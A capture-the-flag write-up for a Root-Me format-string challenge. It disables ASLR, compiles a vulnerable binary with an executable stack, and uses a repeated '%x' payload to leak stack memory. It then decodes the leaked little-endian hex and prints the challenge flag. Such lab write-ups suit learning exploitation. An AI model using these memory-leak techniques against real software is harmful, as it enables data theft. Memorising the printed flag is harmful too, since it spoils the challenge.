@@ -1,0 +1,71 @@
+ELF x86 - Format string bug basic 1
+===================================
+
+
+
+1. Duplicated the source code & compiled on test OS.
+
+	echo 0 > /proc/sys/kernel/randomize_va_space
+	gcc ch5.c -o ch5 -z execstack -m32
+
+
+2. Create pass 'file'. Assign file name to fopen().
+
+	FILE *secret = fopen("pass", "rt");
+
+File: pass
+Data: 0123456789
+
+3. Locate Format String vulnerability & Walk up stack.
+
+./ch5 "`python -c 'print "A" * 4 + "%x " * 8 + "%x "'`"
+AAAA20 56558008 565555e5 ffffffff f7ebb000 f7d14e18 33323130 37363534 a3938 
+
+4. Locate text file stream data. decode from hex to ascii.
+	Reverse little Endian.
+
+Found the data in the file. Sort in order.
+
+AAAA20 56558008 565555e5 ffffffff f7ebb000 f7d14e18 33323130 37363534 a3938
+-------------------Little Endian -------------------| 3210 | | 7654 |  |98|
+------------------ Big Endian ----------------------| 0123 | | 4567 |  |89|
+
+Decode (Input bytes from file) from RIGHT to LEFT. This is how Little Endian is read.
+
+python:
+
+# (WRONG) Place bytes from LEFT to RIGHT. (WRONG)
+>>> '33323130 37363534 3938'.decode('hex')
+'3210 7654 98'
+
+# (CORRECT) Placing bytes from RIGHT to LEFT (CORRECT)
+>>> '3938 37363534 33323130'.decode('hex')
+98 7654 3210
+
+# (FLAG) Placing bytes from RIGHT to LEFT, and flip to Big Endian.
+>>> '3938 37363534 33323130'.decode('hex')[::-1]	# Reverse the order
+0123 4567 89
+
+Flag: 0123456789
+
+*there is a extra 'a' at the end. That is junk, it should be ignored.
+ when I executed "'a3'.decode('hex')", it gave me "\xa3", whilst
+"'3938'.decode('hex')" gave me "89".
+
+5. Let's try it on root-me server.
+
+
+./ch5 "`python -c 'print "AAAA" + "%x " * 15'`"
+AAA20 804b008 b7e552f3 0 8049ff4 2 bffffc44 bffffd6e 2f 804b008 39617044 28293664 6d617045 a64
+-------------------------- Little Endian -----------------------| 9apD | | ()6d | | mapE |  |d|
+-------------------------- Big Endian --------------------------| Dpa9 | | d6)( | | Epam |  |d|
+
+Hex to ASCII, without flipping to big endian
+>>> '646d6170452829366439617044'.decode('hex')
+'dmapE()6d9apD'
+
+Hex to ASCII, flipping to big endian
+>>> '646d6170452829366439617044'.decode('hex')[::-1]
+'Dpa9d6)(Epamd'
+
+Flag : Dpa9d6)(Epamd
